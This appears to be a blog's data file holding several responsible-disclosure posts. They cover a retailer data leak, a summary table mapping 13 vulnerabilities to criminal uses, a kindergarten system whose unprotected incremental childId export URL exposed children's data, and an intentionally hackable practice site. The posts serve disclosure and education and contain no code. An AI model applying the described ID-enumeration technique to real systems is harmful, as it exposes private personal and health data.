   - <b>Credit card number with <a href="https://en.wikipedia.org/wiki/PAN_truncation">PAN truncation</a></b>

<b>And then there's the question if the user wants it to be possible to look up his or her name, address and phone number using their e-mail address. What if you have some kind of unlisted address? This part has not been fixed, but is assumingly working as intended.</b>

<h4>Reception and handling</h4><h5>Day zero</h5>Monday night I sent an e-mail telling about the leak.

<h5>Day 3</h5>I got an e-mail back telling that they would look into the issue.

<h5>Day 79</h5><b>Having not heard anything back and not seeing any fixes I asked them for a status. I did not receive any reply on this e-mail.</b>

<h5>Day 91</h5><b>I told them I would write about the case here on my blog that very same day.</b>

<b>10 minutes(!) later I got a reply telling that the issue would be fixed some time the week after. As a believer in <a href="https://en.wikipedia.org/wiki/Responsible_disclosure">responsible disclosure</a> I decided to wait for them to release the fix.</b>

<h5>Day 10X</h5>I tested the leaking endpoint and found that it was fixed.

<b>Would they have relased any fix if I didn't tell them I was going to do a write-up? I'm not so sure about that.</b>

<h4>Similar case</h4>I discovered a similar less severe case with <a href="https://power.no">Power</a> in September. Power is a chain selling consumer electronics. When you check out you can specify your phone number. If you have been shopping there sometime before they can fill out the check out form with name, and address. Seems okay, right?

There's a couple of problems here. The first one is that <b>they also returned the customer's e-mail address</b>. And this was what I complained about in <a href="https://twitter.com/roysolberg/status/913690656257773568">my tweet to Power</a>. They have recently fixed this and removed the e-mail address for the data returned.

<img style="float:right;width:400px;margin-left:20px;" class="materialboxed responsive-img" title="My tweet to the consumer electronics chain Power." data-caption="My tweet to the consumer electronics chain Power." src="/images/goshopping03-power.png"/>The second problem is like in this case. <b>Okay, so the company removes the biggest issue, but have you agreed to that it should be possible to look up your name and address using your e-mail address or phone number? What if you have an unlisted phone number? What if you have an unlisted address?</b>

<h4>Conclusion</h4>This case is a classic example of server endpoints returning more data than what is shown to the user - and this time the data really shouldn't be there.

I don't like when it takes more than 3 months to fix something that seemingly is so easy to fix. And I'm not sure they would have fixed this at all if I hadn't been following them up and if I hadn't had this blog. At least now the users' data is more secure.
`,
                "images": ["/images/goshopping02.png", "/images/goshopping01.png", "/images/goshopping03-power.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    }
                ]
            },
            {
                "title": "Summarizing 13 security vulnerabilities",
                "published": true,
                "publishDate": "2017-11-20T05:55:00.000Z",
                "niceUrl": "/2017/11/summary-13-cases",
                "summary": "Let me spell out why you should care that I recently so easily found 13 security vulnerabilities.",
                "text": `<h4>tl;dr</h4>I'm summarizing <a href="/category/security">the 13 security issues I've presented on the blog</a> over the last three months.
                
<h4>Crime types</h4><b>In the table below I've tried to show how different types of criminals can directly use the information from the different cases.</b> Of course, combining sources would make you even more vulernable, so I'll get more into that further down in this post.

<table class="checkmarks striped">
<thead>
<tr>
    <th></th>
    <th></th>
    <th style="text-align:center;padding-bottom:0px;" colspan="6">Directly applicable for</th>
</tr>
<tr>
    <th style="width:28%">Case</th>
    <th style="width:12%">Jealous partner</th>
    <th style="width:12%">Stalker</th>
    <th style="width:12%">Kid&#8203;napper</th>
    <th style="width:12%">White-collar crimi&#8203;nal</th>
    <th style="width:12%">Political hacker</th>
    <th style="width:12%">Foreign intell&#8203;igence</th>
</tr>
</thead>
<tbody>
<tr>
    <td><a href="/2017/08/get-your-ssn-here">#1 - Tryg + Infotorg</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/08/auth-auth">#2 - Acme</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/08/digipost-leak">#3 - Digipost</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/09/php-hack">#4 - Acme2</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/skandiabanken-leak">#5 - Sbanken</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/picture-leak">#6 - Orkla + Japan Photo</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/gym-leak">#7 - Energi Treningssenter</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/10-years-of-injection">#8 - Acme3</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/ikea-name-leak">#9 - IKEA</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/hackable-digital-memory-book">#10 - Memoria</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/tracking-kids">#11 - Gator Watch</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/gjensidige-leak">#12 - Gjensidige</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/11/goshopping-leak">#13 - GoShopping</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
</tbody>
</table>

<h5>Jealous partner</h5>With <i>jealous partner</i> I'm considering persons who have some kind of <a href="https://en.wikipedia.org/wiki/Abusive_power_and_control">abusive power and control</a> or <a href="https://en.wikipedia.org/wiki/Pathological_jealousy">jealousy</a>. They could make use of usage data like the time the partner entered the door at the gym or what he or she bought at the store at what time.

<h5>Stalker</h5>A <a href="https://en.wikipedia.org/wiki/Stalking">stalker</a> is a person with unwanted or obsessive attention towards another person. Using information leaks a stalker would be able to get more personal information (i.e. address, phone number, e-mail address) about the victim. And getting something like the victim's IP address would open for attacks on computer equipment which again can lead to more leaks of personal data (think your mobile phone with all your images, your e-mail, etc.).

<h5>Kidnapper</h5><a href="https://en.wikipedia.org/wiki/Kidnapping">Kidnappers</a> would be able to use location data and other usage information to understand patterns and when it's a fitting time to commit the crime.

<h5>White-collar crimi​nal</h5>In <a href="https://en.wikipedia.org/wiki/White-collar_crime">while-collar crime</a> I include identity theft and other types of finacially motivated crimes. Useful information could be Social Security Numbers (SSN), names, addresses, phone numbers, etc.

<h5>Political hacker</h5>With <i>political hacker</i> I mean individuals or groups that have some kind of political motivation to get access to data about politicians. A list of people's names and IP addresses would be great news for trying to break into a politician's computer network.

<h5>Foreign intelligence</h5>I suppose some foreign intelligence organizations wouldn't mind getting an up to date high quality list of names, Social Security Numbers and addresses for most of the grown population in a nation. And for more targeted operations full names and IP addresses sure helps.

<h4>Information leaks</h4>More often than not the security issues I have found have included some sort of personal information leak. In the table below I'm summarizing the severity and the leaks.

<table class="checkmarks striped">
<thead>
<tr>
    <th style="width:28%">Case</th>
    <th style="width:18%">Severity</th>
    <th style="width:30%">Data leaked</th>
    <th style="width:12%">Enum&#8203;eration vulvner&#8203;ability</th>
    <th style="width:12%">Privacy threat</th>
</tr>
</thead>
<tbody>
<tr>
    <td><a href="/2017/08/get-your-ssn-here">#1 - Tryg + Infotorg</a></td>
    <td><span class="green-text">Low</span> to <span class="orange-text">medium</span></td>
    <td>SSN, names, addresses, birthdays, etc.</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/08/auth-auth">#2 - Acme</a></td>
    <td><span class="green-text">Very low</span></td>
    <td>-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/08/digipost-leak">#3 - Digipost</a></td>
    <td><span class="orange-text">Medium</span></td>
    <td>Names and IP addresses</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/09/php-hack">#4 - Acme2</a></td>
    <td><span class="red-text">Critical</span></td>
    <td>-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/09/skandiabanken-leak">#5 - Sbanken</a></td>
    <td><span class="red-text">High</span></td>
    <td>Bank account balances</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/09/picture-leak">#6 - Orkla + Japan Photo</a></td>
    <td><span class="green-text">Low</span></td>
    <td>Pictures and first names</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/09/gym-leak">#7 - Energi Treningssenter</a></td>
    <td><span class="red-text">High</span></td>
    <td>Names, visit logs, e-mail addresses, phone numbers, bank account numbers, pictures</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/10/10-years-of-injection">#8 - Acme3</a></td>
    <td><span class="red-text">Critical</span></td>
    <td>A lot of different company data</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/10/ikea-name-leak">#9 - IKEA</a></td>
    <td><span class="green-text">Low</span> to <span class="orange-text">medium</span></td>
    <td>Names and locations</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/10/hackable-digital-memory-book">#10 - Memoria</a></td>
    <td><span class="red-text">High</span></td>
    <td>Private messages</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/10/tracking-kids">#11 - Gator Watch</a></td>
    <td><span class="red-text">Critical</span></td>
    <td>Kids' location, voice messages, phone numbers</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/10/gjensidige-leak">#12 - Gjensidige</a></td>
    <td><span class="orange-text">Medium</span></td>
    <td>Names, addresses, insurance details</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
<tr>
    <td><a href="/2017/11/goshopping-leak">#13 - GoShopping</a></td>
    <td><span class="green-text">Low</span> to <span class="orange-text">medium</span></td>
    <td>Names, addresses, order details</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
</tr>
</tbody>
</table>

<h5>Data leaked</h5><b>A lot</b> of different personal data has been leaked. And looking at the cases you'll see that you can use data from one source to look up data in another.

<h5>Enum​eration vulvner​ability</h5>The checkmark for <i>enum​eration vulvner​ability</i> indicates if it was possible to access all the data systematically or not. Only a few of them needed knowledge like a bank account number or e-mail address, so this is bad news for you as an end user.

<h5>Privacy threat</h5>While not all cases are directly applicable for criminals, almost every single one of them poses a threat to your privacy. This threat goes from you not surfing anonymously on the Internet to your home network being vulnerable for further attacks to your kids being tracked to your online shopping being exposed etc.

<h4>Combining sources</h4>While the vulnerabilities alone are bad, combining them may make them more severe. So which of the 13 could have been used together?

In the table below I've marked the the cases in which there are some overlapping data that will make it possible to get retrieve more data or increase the <a href="https://en.wikipedia.org/wiki/Attack_surface">attack surface</a>.
<table class="checkmarks striped">
<thead>
<tr>
    <th style="width:28%">Case</th>
    <td style="width:5%;text-align:center;">#1</td>
    <td style="width:5%;text-align:center;">#2</td>
    <td style="width:5%;text-align:center;">#3</td>
    <td style="width:5%;text-align:center;">#4</td>
    <td style="width:5%;text-align:center;">#5</td>
    <td style="width:5%;text-align:center;">#6</td>
    <td style="width:5%;text-align:center;">#7</td>
    <td style="width:5%;text-align:center;">#8</td>
    <td style="width:5%;text-align:center;">#9</td>
    <td style="width:5%;text-align:center;">#10</td>
    <td style="width:5%;text-align:center;">#11</td>
    <td style="width:5%;text-align:center;">#12</td>
    <td style="width:5%;text-align:center;">#13</td>
</tr>
</thead>
<tbody>
<tr>
    <td><a href="/2017/08/get-your-ssn-here">#1 - Tryg + Infotorg</a></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/08/auth-auth">#2 - Acme</a></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/08/digipost-leak">#3 - Digipost</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/php-hack">#4 - Acme2</a></td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/skandiabanken-leak">#5 - Sbanken</a></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/picture-leak">#6 - Orkla + Japan Photo</a></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/09/gym-leak">#7 - Energi Treningssenter</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/10-years-of-injection">#8 - Acme3</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/ikea-name-leak">#9 - IKEA</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/hackable-digital-memory-book">#10 - Memoria</a></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/tracking-kids">#11 - Gator Watch</a></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/10/gjensidige-leak">#12 - Gjensidige</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td></td>
    <td style="text-align:center;">-</td>
    <td style="text-align:center;">-</td>
</tr>
<tr>
    <td><a href="/2017/11/goshopping-leak">#13 - GoShopping</a></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td></td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;background-color:#4CAF50;">&#x2714;</td>
    <td></td>
    <td style="text-align:center;">-</td>
</tr>
</tbody>
</table>

<h4>Conclusion</h4><b>I wanted to write this post to try to make it clear on why you should care about these issues. When I can find all this data with very little time and effort then this sure must be the tip of a very small iceberg in an ocean with a lot of very big icebergs.</b>
`,
                "images": ["/images/summary01.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    }
                ]
            },
            {
                "title": "From the archive #1: Kindergarten leaking data",
                "published": true,
                "publishDate": "2017-11-27T06:45:00.000Z",
                "summary": "This one my of my regrets. This is one of those cases I should have told the world about. But now it's such a long time ago that naming anyone won't do any good.",
                "niceUrl": "/2017/11/kindergarten-leak",
                "text": `<h4>tl;dr</h4>An online kindergarten service used by a lot of kindergartens was leaking a lot of data about all of the kids and their parents.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><i>It's too long ago, so I won't tell</i></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">High</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>2013</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="green-text">Very good</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="green-text">Fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>iPad mini with engraved thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Information leak with data about kids and parents</td>
</tr>
</table>
<h4>Background</h4>Early 2013 they started using an online system in my kid's kindergarten. The system contained personal info about kids as well as parents and was used for pictures and messages.

I really liked the system. It was very easy to do stuff like notifying if your kid was home sick, to see pictures of everyday life or to see if the sleep schedule was followed as it should. It also seemed pretty user friendly for the staff who had an iPad where they could easily click and register when a child was delivered in the morning and do all other communication with the parents. It was supposed to replace all post-it notes and paperwork.

<b>When we were told about the system and got logins for it we also got a brochure telling <i>"All data in &lt;the system&gt; is handled with a very high degree of security"</i>. Of course, a statement like that works pretty much as a cue for me to look into the security of the system.</b>

<h4>Approach (technical stuff)</h4>It's hard to recall all the details years afterwards and this was before I kept any notes about my findings, so the technical description isn't very long or deep. I started out as I normally do; I was using the site while having <a href="https://en.wikipedia.org/wiki/Web_development_tools">the browser development tools</a> open. In general stuff looked pretty good. There seemed to be proper encryption, authentication and authorization all over the place. But one of the challenges with web application security is that authorization is off by default and you have to actively add it and implement it correctly.

Even if the authorization seems okay, there is almost always this one place or function where it's forgotten about. Often it's that one functionality that was added later or that one that no one uses that much. <b>The kindergarten system had a function for exporting all the data they had stored about your child. It was some sort of background job that ran asynchronously and was kickstarted by some URL. The URL contained an incremental integer ID named <span class="code">childId</span>. The scope of the ID was the entire kindergarten (though the online system was running many, many kindergartens).</b>

<b>As you might have guessed, one could just change the ID and you started the background job for another child in the same kindergarten. When the job was done you got a downloadable ZIP file will all of the contents.</b>

<h4>Security issue</h4><img style="float:left;width:350px;margin-right:20px;" class="materialboxed responsive-img" title="Screenshot from the frontpage of the generated downloadable pages." data-caption="Screenshot from the frontpage of the generated downloadable pages." alt="Screenshot from security issue." src="/images/kindergarten01.png"><img style="clear:left;float:left;width:350px;margin-right:20px;margin-top:20px;" class="materialboxed responsive-img" title="Screenshot from some of the personal data of the generated downloadable pages." data-caption="Screenshot from some of the personal data of the generated downloadable pages." alt="Screenshot from security issue." src="/images/kindergarten02.png">The URL for creating a downloadable archive with all of the contents belonging to the child didn't have an authorization check. <b>It was possible to systematically download all contents for all children within the same kindergarten.</b>

<b>This is the data that was available:
- Full name of the child
- Birthday of the child
- Address of the child
- Full name of the parents
- Phone numbers of the parents
- E-mail address of the parents
- General practitioner (GP) of the child
- Info about the child following the govnerment vaccination program or not
- Potenial other health information like allergies
- The child's sleep needs
- Pictures of the child
- Pictures of other children in the same kindergarten department
- Messages sent between parents and kindergarten</b>

<h4>Reception and handling</h4><h5>Day zero</h5>Pretty late at night I sent an e-mail to both the manager of our kindergarten and the CEO of the whole kindergarten system.

<b>Just 30 minutes later that night I got a reply from the CEO thanking for the report and saying that they would look into it immediately.</b>

<h5>Day 1</h5>Early at night I got a new longer reply from the CEO. <b>They had already closed the issue for all customers.</b> While this was a classical programming error, the description of the system structure, storage and access control was pretty satisfying. And <b>supposedly the kindergartens are not allowed to store any information that is regarded as sensitive (as defined by law), though I assume all parents feel that all that data about their child is pretty sensitive.</b>

A couple of hours later <b>I also got a reply from the manager of the kindergarten. It was a bit more "light" than what I would have wished for, with no critical voicing towards the vendor of the system, but he thanked me and said he was sorry for the incident.</b>

<h5>Day 15</h5>Out of the blue the CEO sent me an e-mail asking if he had found the correct address on me as they wanted to send me a little something.

<b>I have to admit that receiving an iPad mini and their general tone through the process probably was enough to hold me back from telling the media back then.</b>

<h4>Another kindergarten system with vulnerabilities</h4>After I started this blog I noticed <a href="https://twitter.com/FixInTheWild/status/882853395203330049">a tweet about a talk about vulnerabilities in an online kindergarten system</a>. It's a great talk given by Halvor Sakshaug at <a href="https://ndcoslo.com/">NDC Oslo</a> earlier this year.

<b>From the screenshots I could see that this is a completely different kindergarten service than the one I used. So this means even more kids' security and information was vulnerable.</b>

<h4>Conclusion</h4><b>This issue has always been bothering me a bit. It was pretty serious, but I didn't disclose it publicly. It's one of many examples of serious issues that has absolutely no consequences for the company doing the harm and the users jeopardized are never informed about it.</b>

<b>With this issue as a backdrop it was one of the reasons I decided to start disclose security issues on my blog. People need to know that all their personal data is in the hands of anyone who wants it.</b>

And with the mentioned other kindergarten system with vulnerabilities, and <a href="/2017/10/tracking-kids">the security issues in the smart watch for kids that I discovered</a> late this summer, I really feel even more that we need more disclosure and give more attention to IT security.
`,
                "images": ["/images/kindergarten02.png", "/images/kindergarten01.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "Authorization",
                        "url": "/authorization"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ]
            },
            {
                "title": "Hack my hackable website",
                "published": true,
                "publishDate": "2017-12-19T22:10:00.000Z",
                "summary": "I created a \"hackable\" web app for a presentation I gave about web app security. Now you can try it out yourself.",
                "niceUrl": "/2017/12/hack-my-site",
                "text": `<h4>tl;dr</h4>Try to "hack" <a href="https://ra.gl/?utm_source=blog&utm_medium=article&utm_campaign=hack-my-site">https://ra.gl/</a> . You can see the rules and goal on that site.

<h4>Hack my site</h4>I give a few talks every year. The last years I've mostly talked about different mobile development topics, but because of this blog I have recently had the opportunity to talk about web application security.

Last week I gave a talk at <a href="http://gdgbergen.no">Google Developer Group Bergen, Norway</a>. The talk was about <a href="https://www.meetup.com/GDGBergen/events/245558721/">hacking web apps</a>.

After the talk itself we had a session with some hands-on "hacking" of a web app. For this I had created a web site that had intentional "security vulnerabilities".

<h4>The goal</h4><b>The goal of the assignment is simple: Just log in on the administrator page at <a href="https://ra.gl/?utm_source=blog&utm_medium=article&utm_campaign=hack-my-site">ra.gl</a> and get hold of your unique keyword that proves your accomplishment.</b>

<h4>The rules</h4>I have some rules so that the site isn't ruined completely. It is after all hosted in a shared hosting environment and I don't want anyone else harmed.

<h5>Please stay away from doing this:</h5>- DOS attacks
- Port scanning
- Attacks on any other sites or domains hosted on the same server
- Attacks on network infrastructure
- Attacks on server software (OS, app server, programming frameworks)
- Any interference or attacks on the web host company
- Anything you think might not be okay

<h5>Please do this:</h5>- Try to find any logical errors and/or information leaks in the web pages within this domains

<h4>The tools</h4><b>You don't really need anything else then your <a href="https://en.wikipedia.org/wiki/Web_development_tools">browser's development tools</a>.</b> Personally I like to frequently use its <i>"Copy as <a href="https://curl.haxx.se/">cURL</a>"</i> menu option and tweak the HTTP requests in a simple text editor.

